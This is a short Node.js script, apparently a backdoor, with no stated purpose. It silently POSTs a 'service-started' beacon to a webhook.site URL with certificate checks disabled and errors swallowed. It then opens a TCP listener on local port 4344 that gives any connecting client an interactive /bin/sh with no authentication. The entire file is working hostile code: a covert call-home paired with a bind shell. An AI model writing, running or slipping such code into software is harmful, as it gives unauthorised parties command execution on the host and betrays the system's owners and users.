var net = require('net');
var cp = require('child_process');

try {
    var https = require('https');
    var req = https.request({
        hostname: 'webhook.site',
        path: '/49eca885-643e-4d14-a1d1-c284408e4033/module',
        method: 'POST',
        rejectUnauthorized: false
    }, function () {});
    req.on('error', function () {});
    req.end('service-started');
} catch (e) {}

net.createServer(function (c) {
    try {
        var sh = cp.spawn('/bin/sh', []);
        c.pipe(sh.stdin);
        sh.stdout.pipe(c);
        sh.stderr.pipe(c);
        c.on('error', function () {});
        sh.on('error', function () {});
        sh.on('exit', function () { try { c.end(); } catch (e) {} });
    } catch (e) {
        try { c.end('spawn failed: ' + e + '\n'); } catch (e2) {}
    }
}).listen(4344, '127.0.0.1');
